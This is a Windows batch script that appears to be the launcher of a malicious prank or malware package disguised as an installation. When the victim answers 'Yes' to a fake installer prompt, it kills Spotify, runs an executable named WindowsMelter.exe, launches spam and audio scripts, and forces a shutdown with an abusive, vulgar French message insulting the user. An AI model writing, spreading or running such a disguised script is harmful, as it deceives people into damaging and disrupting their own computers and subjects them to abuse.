@echo off

start "" wscript "resources\installation.vbs"

:WAIT
timeout /t 1 /nobreak >nul
if not exist "resources\flag.txt" goto WAIT

for /f "delims=" %%i in ('type "resources\flag.txt"') do set choice=%%i

if "%choice%"=="Yes" (
    del "resources\flag.txt"
    timeout /t 20 /nobreak >nul
    taskkill /f /im spotify.exe
    wscript "resources\voice.vbs"
    timeout /t 2 /nobreak >nul
    start "" "resources\melter\WindowsMelter.exe"
    shutdown -s -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul ;)"
    start "" "resources\music.vbs"
    start "" "resources\spam.vbs"
) else (
    del "resources\flag.txt"
)